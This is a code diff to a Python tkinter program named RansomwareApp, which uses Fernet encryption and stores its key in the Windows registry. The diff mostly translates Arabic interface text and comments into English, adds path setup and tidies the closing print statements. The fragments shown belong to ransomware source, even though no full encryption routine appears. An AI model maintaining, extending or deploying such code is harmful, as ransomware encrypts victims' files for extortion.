@@ -1,3 +1,10 @@
+import sys
+import os
+
+_RANSOM_DIR = os.path.dirname(os.path.abspath(__file__))
+if _RANSOM_DIR not in sys.path:
+    sys.path.insert(0, _RANSOM_DIR)
+
 import tkinter as tk
 from tkinter import messagebox, ttk
 from time import sleep
@@ -5,7 +12,6 @@ from cryptography.fernet import Fernet
 import threading
 import random
 import traceback
-import sys
 import winreg
 from variables import *
 
@@ -102,7 +108,7 @@ class RansomwareApp:
         # Progress label
         self.progress_label = tk.Label(
             self.master,
-            text="Press Launch to Start the Program \n\n لبدا البرنامج Launch اضغط على",
+            text="Press Launch to Start the Program",
             font=('Arial', 12),
             fg='green',
             bg='black'
@@ -178,7 +184,7 @@ class RansomwareApp:
 
             self.master.after(0, self.log_message, "Generating your account.... ")
 
-            # استخدام Registry
+            # Using Registry
             key = self.get_key_from_registry()
             if not key:
                 key = Fernet.generate_key()
@@ -333,7 +339,7 @@ class RansomwareApp:
         try:
             self.master.after(0, self.show_decryption_progress)
 
-            # استخدام Registry
+            # Using Registry
             key = self.get_key_from_registry()
             if not key:
                 raise Exception("Encryption key not found. Failed to decrypt")
@@ -507,10 +513,7 @@ def main():
 if __name__ == "__main__":
     main()
     print("All Done! ")  #Debugging
-print("Finished! ")
-
-print("Program Closed. ")
-
-print("By: AhmadMAnis ")
-# By: AhmadMAnis
-
+    print("Finished! ")
+    print("Program Closed. ")
+    print("By: AhmadMAnis ")
+    # By: AhmadMAnis
